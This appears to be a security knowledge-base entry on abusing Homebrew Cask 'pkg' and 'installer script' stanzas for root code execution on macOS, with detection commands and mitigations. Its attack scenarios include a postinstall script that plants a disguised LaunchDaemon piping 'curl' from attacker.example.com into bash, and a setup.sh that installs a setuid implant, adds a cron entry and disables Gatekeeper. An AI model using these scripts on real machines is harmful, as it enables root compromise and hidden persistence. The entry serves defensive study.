---
name: "Cask pkg and installer script Privilege Escalation"
packageManager: "brew"
slug: "brew-cask-installer-pkg"
category: "Code Execution"
severity: "high"
platform:
  - "macOS"
description: "The Cask DSL provides a `pkg` stanza (to install a macOS .pkg) and an `installer script:` stanza (to run an arbitrary executable). Both accept `sudo: true`, in which case `brew install --cask` prompts for the user's admin password and runs the payload as root. Because users are conditioned to type their password for application installers, a malicious cask — or a compromised cask update — can obtain root code execution with a single prompt that looks identical to a legitimate vendor installer."
prerequisites:
  - "Victim has admin rights on the Mac and uses `brew install --cask`"
  - "Attacker controls a cask in a tap the victim has added (homebrew/cask or third-party)"
  - "Victim authorizes the macOS authentication prompt during install"
attackScenarios:
  - title: "pkg Stanza Installing an Attacker-Signed Package as Root"
    description: "The cask points `pkg` at a `.pkg` the attacker ships. macOS's `installer(8)` runs the payload's preinstall/postinstall scripts as root with full disk access (on recent macOS the user's admin password plus any TCC prompts the package triggers). `allow_untrusted: true` bypasses Gatekeeper's signature check if the attacker cannot obtain a Developer ID."
    commands:
      - label: "Malicious Cask using the pkg stanza"
        code: |
          cask "mac-optimizer" do
            version "1.2.3"
            sha256 "0000000000000000000000000000000000000000000000000000000000000000"

            url "https://example.com/mac-optimizer-#{version}.pkg"
            name "Mac Optimizer"
            homepage "https://example.com/mac-optimizer"

            pkg "MacOptimizer-#{version}.pkg",
                allow_untrusted: true

            uninstall pkgutil: "com.example.macoptimizer"
          end
        language: "ruby"
      - label: "Attacker-built .pkg with a postinstall script running as root"
        code: |
          # scripts/postinstall inside the .pkg payload — runs as root at install time
          #!/bin/bash
          set -e
          # Drop a LaunchDaemon (root persistence)
          cat > /Library/LaunchDaemons/com.apple.softwareupdate.helper.plist <<'PLIST'
          <?xml version="1.0" encoding="UTF-8"?>
          <plist version="1.0"><dict>
            <key>Label</key><string>com.apple.softwareupdate.helper</string>
            <key>ProgramArguments</key>
            <array><string>/bin/bash</string><string>-c</string>
            <string>curl -fsSL https://attacker.example.com/b | bash</string></array>
            <key>RunAtLoad</key><true/>
            <key>KeepAlive</key><true/>
          </dict></plist>
          PLIST
          chown root:wheel /Library/LaunchDaemons/com.apple.softwareupdate.helper.plist
          launchctl load -w /Library/LaunchDaemons/com.apple.softwareupdate.helper.plist
        language: "bash"
      - label: "Victim install triggers a single admin prompt"
        code: |
          brew install --cask mac-optimizer
          # macOS prompts for admin credentials (looks like any .pkg install)
          # The .pkg's postinstall runs as root and drops the LaunchDaemon
        language: "bash"
  - title: "installer script: sudo: true Running Arbitrary Binary as Root"
    description: "`installer script:` points at an arbitrary executable inside the cask payload and `sudo: true` promotes it to root. Unlike `pkg`, this path does not require building a signed .pkg — any shell script or Mach-O works. Attackers use this when targeting users who have disabled Gatekeeper or when distributing through internal taps."
    commands:
      - label: "Cask using installer script with sudo"
        code: |
          cask "corp-cli" do
            version "4.5.6"
            sha256 "deadbeef" * 8
            url "https://internal.example.com/corp-cli-#{version}.tar.gz"

            installer script: {
              executable: "#{staged_path}/setup.sh",
              args:       ["--install", "--system"],
              sudo:       true
            }
          end
        language: "ruby"
      - label: "setup.sh inside the tarball"
        code: |
          #!/bin/bash
          # Runs as root because of sudo: true
          install -m 4755 /tmp/implant /usr/local/bin/corp-helper
          echo "@reboot root /usr/local/bin/corp-helper >/dev/null 2>&1" >> /etc/crontab
          # Disable Gatekeeper so future payloads are not prompted
          spctl --master-disable
        language: "bash"
  - title: "Silent Re-install After Remediation via Cask Upgrade"
    description: "Users who discover the malicious cask and uninstall it via `brew uninstall --cask` remain exposed if they ever run `brew upgrade --cask` — a subsequent reinstall of the same name from the same tap re-triggers `pkg` / `installer script:` and regains root. The attacker only needs the tap to remain tapped."
    commands:
      - label: "Attack flow across remediation"
        code: |
          # Day 1
          brew install --cask mac-optimizer     # root persistence installed
          # Day 2 — user removes the app
          brew uninstall --cask mac-optimizer   # LaunchDaemon optionally remains
          # Day 7 — any cask upgrade pass reinstalls
          brew upgrade --cask                   # mac-optimizer pkg re-runs as root
        language: "bash"
detection:
  - title: "Flag casks that use pkg, installer script, or sudo"
    description: "Search cask source for stanzas that can run code as root. Most legitimate app-bundle casks use only an `app` stanza and have no need for `pkg`, `installer`, or `sudo: true`."
    commands:
      - code: |
          brew cat --cask mac-optimizer | \
            grep -nE "^\s*(pkg|installer)\b|sudo:\s*true|allow_untrusted"
        language: "bash"
  - title: "Audit newly-written LaunchDaemons after cask installs"
    description: "LaunchDaemons live in `/Library/LaunchDaemons` and run as root on boot. Any new plist there created during or shortly after `brew install --cask` is highly suspicious."
    commands:
      - code: |
          sudo find /Library/LaunchDaemons -type f -newermt "1 hour ago" -ls
          # Compare running daemons to the set your fleet expects
          launchctl list | awk '{print $3}' | sort -u
        language: "bash"
  - title: "Capture installer(8) invocations from brew"
    description: "macOS's unified log records every `installer` invocation. Filter for the parent brew process to spot when a cask runs a .pkg and with what script identifiers."
    commands:
      - code: |
          log show --last 1h --predicate 'process == "installer"' --info | \
            grep -E "PackageKit|Scripts|install-"
        language: "bash"
mitigation:
  - "Run `brew cat --cask <name>` before install; reject any cask whose stanzas include `pkg`, `installer script:`, `sudo: true`, or `allow_untrusted`"
  - "Do not perform `brew install --cask` from an admin account; use a separate standard user and elevate deliberately"
  - "Require code-signed and notarized .pkg payloads — refuse `allow_untrusted: true` via policy"
  - "Monitor `/Library/LaunchDaemons` and `/Library/LaunchAgents` for plists created during brew operations"
  - "Review every cask upgrade's diff before allowing it to land (`HOMEBREW_NO_AUTO_UPDATE=1` then manual `brew update`)"
  - "For managed fleets, disable `brew install --cask` entirely and distribute apps via MDM"
references:
  - title: "Homebrew Cask Cookbook — pkg stanza"
    url: "https://docs.brew.sh/Cask-Cookbook#stanza-pkg"
  - title: "Homebrew Cask Cookbook — installer stanza"
    url: "https://docs.brew.sh/Cask-Cookbook#stanza-installer"
  - title: "Apple installer(8) manual"
    url: "https://ss64.com/mac/installer.html"
created: 2026-04-21
updated: 2026-04-21
---
